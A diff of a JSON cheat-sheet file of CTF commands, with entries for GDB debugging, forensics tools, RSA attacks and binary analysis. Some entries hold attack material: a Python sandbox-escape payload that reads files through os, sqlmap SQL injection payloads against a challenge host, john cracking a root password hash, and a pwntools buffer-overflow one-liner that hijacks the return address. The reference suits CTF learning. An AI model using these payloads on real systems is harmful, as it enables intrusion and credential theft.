+      "Apply command to all threads.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
+      "(gdb) thread apply all backtrace\n                                \nThread 2 (Thread 0x7ffff77f5700 (LWP 27231)):\n#0  myThreadFunc (vargp=0x0) at main.c:18\n#1  0x00007ffff7bc4182 in start_thread (arg=0x7ffff77f5700)\n    at pthread_create.c:312\n#2  0x00007ffff78f130d in clone ()\n    at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n                               \nThread 1 (Thread 0x7ffff7fe7740 (LWP 27227)):\n#0  0x00007ffff7bc566b in pthread_join (threadid=140737345705728,\n    thread_return=0x0) at pthread_join.c:92\n#1  0x00000000004006e4 in main () at main.c:26"
     ],
     [
       "GDB",
       "Commands",
-      "60",
+      "170",
       "No",
-      "stepi",
-      "Execute one machine instruction, then stop and return to the debugger.\nAbbreviated si.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "(gdb) nexti\n0x00000000004005d6      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n=\u003e 0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) stepi\nsum (a=0, b=4195917) at main.c:17\n17      {\n=\u003e 0x0000000000400564 \u003csum+0\u003e:  55      push   rbp\n   0x0000000000400565 \u003csum+1\u003e:  48 89 e5        mov    rbp,rsp\n   0x0000000000400568 \u003csum+4\u003e:  48 83 ec 10     sub    rsp,0x10\n   0x000000000040056c \u003csum+8\u003e:  89 7d fc        mov    DWORD PTR [rbp-0x4],edi\n   0x000000000040056f \u003csum+11\u003e: 89 75 f8        mov    DWORD PTR [rbp-0x8],esi"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "50",
-      "No",
-      "step",
-      "Continue running your program until control reaches a different source line, then stop it and return control to GDB.\nAbbreviated s.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n(gdb) step\nsum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "85",
-      "No",
-      "finish",
-      "Continue running until just after function in the selected stack frame returns. Print the returned value (if any).\nAbbreviated fin.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "(gdb) finish\nRun till exit from #0  sum (a=4, b=3) at main.c:18\nSum of 4 and 3\n0x00000000004005db in main () at main.c:34\n34          s = sum(4, 3);\nValue returned is $1 = 7"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "40",
-      "No",
-      "break \u003cfunction\u003e",
-      "Set breakpoint.\nAbbreviated b.\nUse break \u003cfunction\u003e to set breakpoint using function name.\nUse break *\u003caddress\u003e to set breakpoint using address.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Set-Breaks.html",
-      "(gdb) break sum\nBreakpoint 1 at 0x400572: file main.c, line 18.\n(gdb) r\nStarting program: /home/a.out\n                             \nBreakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n\n(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) break *0x400552\nBreakpoint 3 at 0x400552: file main.c, line 13.\n(gdb) c\nContinuing.\n           \nBreakpoint 3, 0x0000000000400552 in log (str=0x400674 \"Sum of %d and %d\",\n    param1=4, param2=3) at main.c:13\n13          printf(str, param1, param2);"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "30",
-      "No",
-      "continue",
-      "Resume program execution, at the address where your program last stopped.\nAbbreviated c.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "Breakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n(gdb) c\nContinuing.\nSum of 4 and 3"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "10",
-      "No",
-      "run",
-      "Start your program under GDB. \nAbbreviated r.\nUse r \u003c input.txt (where input.txt contains input for the standard input of the program)",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Starting.html",
-      "Reading symbols from /home/a.out...done.\n(gdb) r\nStarting program: /home/a.out \n\nReading symbols from /home/a.out...done.\n(gdb) r \u003c input.txt\nStarting program: /home/a.out  "
-    ],
-    [
-      "GDB",
-      "Commands",
-      "20",
-      "No",
-      "quit",
-      "Quit execution.\nAbbreviated q.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Quitting-GDB.html#Quitting-GDB",
-      "(gdb) q\nA debugging session is active.\n                              \n        Inferior 1 [process 26432] will be killed.\n                     \nQuit anyway? (y or n)"
-    ],
-    [
-      "GDB",
-      "Settings",
-      "",
-      "No",
-      "display/i $pc",
-      "Display the machine instruction about to be executed each time execution stops.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Auto-Display.html#Auto-Display",
-      "(gdb) display /i $pc\n(gdb) r\nStarting program: /home/a.out\n                             \nBreakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n1: x/i $pc                                  \n=\u003e 0x400572 \u003csum+14\u003e:   mov    edx,DWORD PTR [rbp-0x8]"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "45",
-      "No",
-      "info break",
-      "List breakpoints.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Set-Breaks.html",
-      "(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time                                 \n2       breakpoint     keep y   0x0000000000400596 in main at main.c:25"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "47",
-      "No",
-      "delete \u003cbreakpoint\u003e",
-      "Delete breakpoint.\nAbbreviated d.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Delete-Breaks.html",
-      "(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time                                 \n2       breakpoint     keep y   0x0000000000400596 in main at main.c:25\n(gdb) d 2\n(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time"
+      "thread \u003cThreadNumber\u003e",
+      "Make thread number ThreadNumber the current thread.\nThe command argument ThreadNumber is the internal gdb thread number, as shown in the first field of the 'info threads' display.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
+      "(gdb) info thread\n  Id   Target Id         Frame\n  2    Thread 0x7ffff77f5700 (LWP 27231) \"a.out\" myThreadFunc (vargp=0x0)\n    at main.c:18\n* 1    Thread 0x7ffff7fe7740 (LWP 27227) \"a.out\" 0x00007ffff7bc566b in pthread_join (threadid=140737345705728, thread_return=0x0) at pthread_join.c:92\n\n(gdb) thread 2\n[Switching to thread 2 (Thread 0x7ffff77f5700 (LWP 27231))]\n#0  myThreadFunc (vargp=0x0) at main.c:18\n18          while(1);"
     ],
     [
       "GDB",
@@ -313,13 +294,33 @@
     ],
     [
       "GDB",
-      "Commands",
-      "95",
+      "Settings",
+      "",
       "No",
-      "x /\u003cnfu\u003e \u003caddr\u003e",
-      "Examine memory.\n\nn, f, and u are all optional parameters that specify how much memory to display and how to format it; addr is an expression giving the address where you want to start displaying memory. \n\nn, the repeat count:\n    The repeat count is a decimal integer; the default is 1. It specifies how much memory (counting by units u) to display. \n\nf, the display format:\n    The display format is one of the formats used by print (‘x’, ‘d’, ‘u’, ‘o’, ‘t’, ‘a’, ‘c’, ‘f’, ‘s’), and in addition ‘i’ (for machine instructions). \n\nu, the unit size:\n    b for Bytes, h for Halfwords (two bytes), w for Words (four bytes), g for Giant words (eight bytes). \n",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Memory.html",
-      "(gdb) p &arr\n$2 = (int (*)[40]) 0x7fffffffeac0\n(gdb) x /32xw $2\n0x7fffffffeac0: 0x00000001      0x00000002      0x00000003      0x00000004\n0x7fffffffead0: 0x00000005      0x00000006      0x00000007      0x00000008\n0x7fffffffeae0: 0x00000009      0x0000000a      0x0000000b      0x0000000c\n0x7fffffffeaf0: 0x0000000d      0x0000000e      0x0000000f      0x00000010\n0x7fffffffeb00: 0x00000011      0x00000012      0x00000013      0x00000014\n0x7fffffffeb10: 0x00000015      0x00000016      0x00000017      0x00000018\n0x7fffffffeb20: 0x00000019      0x0000001a      0x0000001b      0x0000001c\n0x7fffffffeb30: 0x0000001d      0x0000001e      0x0000001f      0x00000020\n\n(gdb) x /10xb $2\n0x7fffffffeac0: 0x01    0x00    0x00    0x00    0x02    0x00    0x00    0x00\n0x7fffffffeac8: 0x03    0x00"
+      "set print pretty on",
+      "Cause GDB to print structures in an indented format with one member per line.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
+      "(gdb) p var1\n$1 = {next = 0x0, flags = {sweet = 1, sour = 1}, meat = 0x54 \"Beef\"}\n\n(gdb) set print pretty on\n(gdb) p var1\n$2 = {\n  next = 0x0,\n  flags = {\n    sweet = 1,\n    sour = 1\n  },\n  meat = 0x54 \"Beef\"\n}"
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "set print array-indexes on",
+      "Print the index of each element when displaying arrays.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
+      "(gdb) print myArr\n$1 = {1, 2, 3, 4}\n\n(gdb) set print array-indexes on\n\n(gdb) print myArr\n$2 = {[0] = 1, [1] = 2, [2] = 3, [3] = 4}"
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "set output-radix \u003cbase\u003e",
+      "Set the default base for numeric display.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Numbers.html",
+      "(gdb) set output-radix 16 \np my_ctx $1 = {\n  state = STATE_ACTIVE,  \n  state_ctx = {\n    list = 0x0,\n    fd = 0xffffffff\n}\n\n(gdb) set output-radix 10 \np my_ctx $2 = {  \n  state = STATE_ACTIVE,  \n  state_ctx = {\n    list = 0,\n    fd = -1\n}"
     ],
     [
       "Forensics",
@@ -344,7 +345,7 @@
     [
       "Forensics",
       "Binaries",
-      "0",
+      "10",
       "No",
       "binwalk \u003cbinary\u003e",
       "Analyse binary files for embeded files and executable code.\n\nTo extract embeded files from the original binary, use:\nbinwalk -e \u003cbinary\u003e",
@@ -357,7 +358,7 @@
       "0",
       "No",
       "\"\".__class__.mro()[2].__subclasses__()[59]",
-      "Bypass sandbox restrictions to access built in types.\n\nThe goal is to arrive to \u003cclass 'warnings.catch_warnings'\u003e. indices may vary.\n\nFor example:\n''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')\n\n''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('app.py').read()",
+      "Bypass sandbox restrictions to access built in types.\n\nThe goal is to arrive to \u003cclass 'warnings.catch_warnings'\u003e. indices may vary.\n\nFor example:\n''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')\n\n''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('app.py').read()\n\n''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').listdir('.')",
       "https://www.google.com/search?q=ctf+warnings.catch_warnings\nhttp://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/\nhttps://sysexit.wordpress.com/2012/10/26/hacklu-ctf-2012-python-jail-200-write-up/\nhttps://zolmeister.com/2013/05/escaping-python-sandbox.html\nhttps://gynvael.coldwind.pl/n/python_sandbox_escape\n",
       "\u003e\u003e\u003e ''.__class__.mro()[2].__subclasses__()[59]\n\u003cclass 'warnings.catch_warnings'\u003e\n\u003e\u003e\u003e ''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os']\n\u003cmodule 'os' from '/usr/local/lib/python2.7/os.pyc'\u003e"
     ],
@@ -384,7 +385,7 @@
     [
       "Crypto",
       "RSA",
-      "0",
+      "10",
       "No",
       "RsaCtfTool.py --publickey \u003ckey.pub\u003e --private",
       "Attack RSA, attempt to find private key",
@@ -398,7 +399,7 @@
       "No",
       "sqlmap -u \u003curl\u003e",
       "Automate the process of detecting and exploiting SQL injection flaws.",
-      "http://sqlmap.org/",
+      "http://sqlmap.org/\nhttp://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html",
       "sqlmap -u https://ad521d5b99e850729b9d3694ceb69bba.lupus.avatao-challenge.com/?order=id\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.2.5#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting at 13:30:59\n\n[13:31:00] [INFO] testing connection to the target URL\n[13:31:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[13:31:01] [INFO] testing if the target URL content is stable\n[13:31:01] [INFO] target URL content is stable\n[13:31:01] [INFO] testing if GET parameter 'order' is dynamic\n[13:31:01] [INFO] confirming that GET parameter 'order' is dynamic\n[13:31:02] [WARNING] GET parameter 'order' does not appear to be dynamic\n[13:31:02] [INFO] heuristic (basic) test shows that GET parameter 'order' might be injectable (possible DBMS: 'MySQL')\n[13:31:02] [INFO] testing for SQL injection on GET parameter 'order'\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y\n[13:33:55] [INFO] testing 'MySQL \u003e= 5.0.12 AND time-based blind'\n[13:34:56] [INFO] GET parameter 'order' appears to be 'MySQL \u003e= 5.0.12 AND time-based blind' injectable \n[13:36:20] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'\n[13:36:28] [INFO] checking if the injection point on GET parameter 'order' is a false positive\nGET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\nsqlmap identified the following injection point(s) with a total of 525 HTTP(s) requests:\n---\nParameter: order (GET)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause\n    Payload: order=id RLIKE (SELECT (CASE WHEN (7213=7213) THEN 0x6964 ELSE 0x28 END))\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: order=id AND SLEEP(5)\n---\n[13:36:36] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.5.9\nback-end DBMS: MySQL \u003e= 5.0.12\n[13:36:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ad521d5b99e850729b9d3694ceb69bba.lupus.avatao-challenge.com'\n\n[*] shutting down at 13:36:36\n"
     ],
     [
@@ -537,7 +538,7 @@
       "ltrace \u003cexecutable\u003e",
       "ltrace intercepts library calls and system calls made by your application to C libraries such as the glibc.\n\nIf unable to install on latest distribution, see:\nhttp://anthonyvoza.blogspot.com/2018/08/beginners-quest-google-ctf-5-gatekeeper.html",
       "http://man7.org/linux/man-pages/man1/ltrace.1.html",
-      "$ ltrace ./TheNameCalculator\n__libc_start_main(0x804872a, 1, 0xffb002b4, 0x80487d0 \u003cunfinished ...\u003e\nputs(\"What is your name?\"What is your name?\n)                                                                            = 19\nfflush(0xf7f38d80)                                                                                    = 0\nread(0test\n, \"test\\n\", 32)                                                                                 = 5\nfflush(0xf7f385c0)                                                                                    = 0\nputs(\"I've heard better\"I've heard better\n)                                                                             = 18\nfflush(0xf7f38d80)                                                                                    = 0\nexit(0 \u003cno return ...\u003e\n+++ exited (status 0) +++"
+      "$ ltrace ./TheNameCalculator\n__libc_start_main(0x804872a, 1, 0xffb002b4, 0x80487d0 \u003cunfinished ...\u003e\nputs(\"What is your name?\"What is your name?\n)                                                                            = 19\nfflush(0xf7f38d80)                                                                                    = 0\nread(0test\n, \"test\\n\", 32)                                                                                 = 5\nfflush(0xf7f385c0)                                                                                    = 0\nputs(\"I've heard better\"I've heard better\n)                                                                             = 18\nfflush(0xf7f38d80)                                                                                    = 0\nexit(0 \u003cno return ...\u003e\n+++ exited (status 0) +++\n\n\n$ ltrace ./radix test\n__libc_start_main(0x8048737, 2, 0xff8463a4, 0x80487d0 \u003cunfinished ...\u003e\nsetvbuf(0xf7f1ad80, 0, 2, 0)                                                                          = 0\nstrlen(\"test\")                                                                                        = 4\nstrncmp(\"dGVzdA==\", \"cGljb0NURntiQXNFXzY0X2VOQ29EaU5n\"..., 8)                                         = 1\nputs(\"Incorrect Password!\"Incorrect Password!\n)                                                                           = 20\n+++ exited (status 255) +++"
     ],
     [
       "Executables",
@@ -684,6 +685,417 @@
       "p",
       "Change view.",
       "See information for \"r2\"."
+    ],
+    [
+      "Passwords",
+      "john",
+      "10",
+      "No",
+      "unshadow \u003cpasswd_file\u003e \u003cshadow_file\u003e",
+      "Combine the passwd and shadow files so John can use them.",
+      "https://manpages.debian.org/jessie/john/unshadow.8.en.html\nhttps://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux",
+      "$ unshadow passwd shadow \u003e mypass.txt\n$ cat mypass.txt \nroot:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:0:0:root:/root:/bin/bash\n$ john mypass.txt \nWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\"\nUse the \"--format=crypt\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (root)\n1g 0:00:00:01 DONE 2/3 (2018-10-08 23:22) 0.6666g/s 587.4p/s 587.4c/s 587.4C/s 123456..green\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed"
+    ],
+    [
+      "Passwords",
+      "john",
+      "20",
+      "No",
+      "john \u003cpassword_file\u003e",
+      "Attempt to crack password.",
+      "https://manpages.debian.org/jessie/john/john.8.en.html",
+      "$ unshadow passwd shadow \u003e mypass.txt\n$ cat mypass.txt \nroot:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:0:0:root:/root:/bin/bash\n$ john mypass.txt \nWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\"\nUse the \"--format=crypt\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (root)\n1g 0:00:00:01 DONE 2/3 (2018-10-08 23:22) 0.6666g/s 587.4p/s 587.4c/s 587.4C/s 123456..green\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed"
+    ],
+    [
+      "Forensics",
+      "Steganography",
+      "0",
+      "No",
+      "zsteg \u003cimage\u003e",
+      "Detect stegano-hidden data in PNG & BMP.",
+      "https://github.com/zed-0xff/zsteg",
+      "$ zsteg image.png \nb1,r,lsb,xy         .. text: \"^5\u003ec[rvyzrf@\"\nb1,rgb,lsb,xy       .. text: \"picoCTF{r34d1ng_b37w33n_7h3_by73s}\"\nb1,abgr,msb,xy      .. file: PGP\\011Secret Sub-key -\nb2,g,msb,xy         .. text: \"ADTU@PEPA\"\nb3,abgr,msb,xy      .. text: \"t@Wv!Wt\\tGtA\"\nb4,r,msb,xy         .. text: \"0Tt7F3Saf\"\nb4,g,msb,xy         .. text: \"2g'uV `3\"\nb4,b,lsb,xy         .. text: \"##3\\\"TC%\\\"2f\"\nb4,b,msb,xy         .. text: \" uvb&b@f!\"\nb4,rgb,lsb,xy       .. text: \"1C5\\\"RdWD\"\nb4,rgb,msb,xy       .. text: \"T E2d##B#VuQ`\"\nb4,bgr,lsb,xy       .. text: \"A%2RTdGG\"\nb4,bgr,msb,xy       .. text: \"EPD%4\\\"c\\\"#CUVqa \"\nb4,rgba,lsb,xy      .. text: \"?5/%/d_tO\"\nb4,abgr,msb,xy      .. text: \"EO%O#/c/2/C_e_q\""
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "10",
+      "No",
+      "fls \u003cfile_system\u003e",
+      "Lists the files and directory names in a file system. \nIt will process the contents of a given directory and can display information on deleted files.",
+      "https://wiki.sleuthkit.org/index.php?title=Fls",
+      "# fls animals.dd \nr/r 4:\tdachshund.jpg\nr/r * 6:\tfox.jpg\nr/r 8:\tfrog.jpg\nr/r * 10:\tgiraffe.jpg\nr/r 12:\tmusic.jpg\nr/r * 14:\trabbit2.jpg\nr/r 16:\trabbit.jpg\nr/r * 18:\ttheflag.jpg\nv/v 327027:\t$MBR\nv/v 327028:\t$FAT1\nv/v 327029:\t$FAT2\nV/V 327030:\t$OrphanFiles"
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "20",
+      "No",
+      "icat \u003cfile_system\u003e \u003cinode_id\u003e",
+      "Outputs the contents of a file in a disk image to STDOUT.",
+      "https://wiki.sleuthkit.org/index.php?title=Icat",
+      "# fls animals.dd \nr/r 4:\tdachshund.jpg\nr/r * 6:\tfox.jpg\nr/r 8:\tfrog.jpg\nr/r * 10:\tgiraffe.jpg\nr/r 12:\tmusic.jpg\nr/r * 14:\trabbit2.jpg\nr/r 16:\trabbit.jpg\nr/r * 18:\ttheflag.jpg\nv/v 327027:\t$MBR\nv/v 327028:\t$FAT1\nv/v 327029:\t$FAT2\nV/V 327030:\t$OrphanFiles\n# icat animals.dd 18 \u003e theflag.jpg"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "20",
+      "No",
+      "binwalk --dd=\".*\" \u003cfile_name\u003e",
+      "Extract any file type using Binwalk (not just known types).",
+      "https://github.com/ReFirmLabs/binwalk/wiki/Usage",
+      "# binwalk --dd=\".*\" animals.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n39424         0x9A00          JPEG image data, JFIF standard 1.01\n39454         0x9A1E          TIFF image data, big-endian, offset of first image directory: 8\n672256        0xA4200         JPEG image data, JFIF standard 1.01\n1165824       0x11CA00        JPEG image data, JFIF standard 1.01\n1556992       0x17C200        JPEG image data, JFIF standard 1.01\n1812992       0x1BAA00        JPEG image data, JFIF standard 1.01\n1813022       0x1BAA1E        TIFF image data, big-endian, offset of first image directory: 8\n2136576       0x209A00        JPEG image data, JFIF standard 1.01\n2136606       0x209A1E        TIFF image data, big-endian, offset of first image directory: 8\n2607616       0x27CA00        JPEG image data, JFIF standard 1.01\n2607646       0x27CA1E        TIFF image data, big-endian, offset of first image directory: 8\n3000832       0x2DCA00        JPEG image data, JFIF standard 1.01\n3000862       0x2DCA1E        TIFF image data, big-endian, offset of first image directory: 8"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "foremost \u003cbinary\u003e",
+      "Recover files based on their headers, footers, and internal data structures.",
+      "http://foremost.sourceforge.net/",
+      "# foremost animals.bin \nProcessing: animals.bin\n|*|\n\n# cat output/audit.txt \nForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus\nAudit File\n\nForemost started at Thu Oct 11 23:23:12 2018\nInvocation: foremost animals.bin \nOutput directory: /media/sf_CTFs/pico/Recovering_From_the_Snap/output\nConfiguration file: /etc/foremost.conf\n------------------------------------------------------------------\nFile: animals.bin\nStart: Thu Oct 11 23:23:12 2018\nLength: 10 MB (10485760 bytes)\n \nNum\t Name (bs=512)\t       Size\t File Offset\t Comment \n\n0:\t00000077.jpg \t     617 KB \t      39424 \t \n1:\t00001313.jpg \t     481 KB \t     672256 \t \n2:\t00002277.jpg \t     380 KB \t    1165824 \t \n3:\t00003041.jpg \t     248 KB \t    1556992 \t \n4:\t00003541.jpg \t     314 KB \t    1812992 \t \n5:\t00004173.jpg \t     458 KB \t    2136576 \t \n6:\t00005093.jpg \t     383 KB \t    2607616 \t \n7:\t00005861.jpg \t      39 KB \t    3000832 \t \nFinish: Thu Oct 11 23:23:13 2018\n\n8 FILES EXTRACTED\n\t\njpg:= 8\n------------------------------------------------------------------\n\nForemost finished at Thu Oct 11 23:23:13 2018\n#"
+    ],
+    [
+      "System",
+      "Core Dump",
+      "10",
+      "No",
+      "ulimit -c unlimited",
+      "Set the maximum size of core dump files created to unlimited.",
+      "https://ss64.com/bash/ulimit.html",
+      "# ulimit -c unlimited"
+    ],
+    [
+      "System",
+      "Core Dump",
+      "20",
+      "No",
+      "echo \u003cpath\u003e \u003e /proc/sys/kernel/core_pattern",
+      "Set the location to save a core dump.\nIt's problematic for this path to be an NTFS file system.",
+      "http://man7.org/linux/man-pages/man5/core.5.html",
+      "# echo /root/core/core_dump \u003e /proc/sys/kernel/core_pattern"
+    ],
+    [
+      "Executables",
+      "Buffer Overflow",
+      "10",
+      "No",
+      "cyclic \u003cnumber\u003e",
+      "Generate a unique sequence of \u003cnumber\u003e elements to help exploit buffer overflows.",
+      "http://docs.pwntools.com/en/stable/util/cyclic.html",
+      "# ulimit -c unlimited\n# echo /root/core/core_dump \u003e /proc/sys/kernel/core_pattern\n# cyclic 50\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n# cyclic 50 | ./vuln\nPlease enter your string: \nOkay, time to return... Fingers Crossed... Jumping to 0x6161616c\nSegmentation fault (core dumped)\n# dmesg | grep vuln\n[ 1487.620793] vuln[1601]: segfault at 6161616c ip 000000006161616c sp 00000000ffcbf9a0 error 14 in libc-2.27.so[f7d59000+19000]\n# gdb vuln /root/core/core_dump\nGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git\n...\nReading symbols from vuln...(no debugging symbols found)...done.\n[New LWP 1623]\nCore was generated by `./vuln'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x6161616c in ?? ()\ngdb-peda$ p $eip\n$1 = (void (*)()) 0x6161616c\n# cyclic -l 0x6161616c\n44\n"
+    ],
+    [
+      "Executables",
+      "Buffer Overflow",
+      "20",
+      "No",
+      "cyclic -l \u003clookup_value\u003e",
+      "Search for the location of the given value in the cyclic pattern.",
+      "http://docs.pwntools.com/en/stable/util/cyclic.html",
+      "# ulimit -c unlimited\n# echo /root/core/core_dump \u003e /proc/sys/kernel/core_pattern\n# cyclic 50\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n# cyclic 50 | ./vuln\nPlease enter your string: \nOkay, time to return... Fingers Crossed... Jumping to 0x6161616c\nSegmentation fault (core dumped)\n# dmesg | grep vuln\n[ 1487.620793] vuln[1601]: segfault at 6161616c ip 000000006161616c sp 00000000ffcbf9a0 error 14 in libc-2.27.so[f7d59000+19000]\n# gdb vuln /root/core/core_dump\nGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git\n...\nReading symbols from vuln...(no debugging symbols found)...done.\n[New LWP 1623]\nCore was generated by `./vuln'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x6161616c in ?? ()\ngdb-peda$ p $eip\n$1 = (void (*)()) 0x6161616c\n# cyclic -l 0x6161616c\n44\n\n# objdump -D vuln | grep \"\u003cwin\u003e\"\n080485cb \u003cwin\u003e:\n# python -c \"from pwn import *;print('A'*44 + p32(0x080485cb))\" | ./vuln\nPlease enter your string: \nOkay, time to return... Fingers Crossed... Jumping to 0x80485cb"
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "set print elements \u003cnumber-of-elements\u003e",
+      "Set a limit on how many elements of an array GDB will print.\nDefault is 200. 0 for unlimited.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
+      "(gdb) set print elements 5\n(gdb) p arr\n$1 = {0, 1, 2, 3, 4...}\n\n(gdb) set print elements 0\n(gdb) p arr\n$2 = {0, 1, 2, 3, 4, 5, 6}\n"
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "dump \u003cbinary\u003e memory \u003cfilename.bin\u003e \u003cstart_addr\u003e \u003cend_addr\u003e",
+      "Dumps a memory range to a file.",
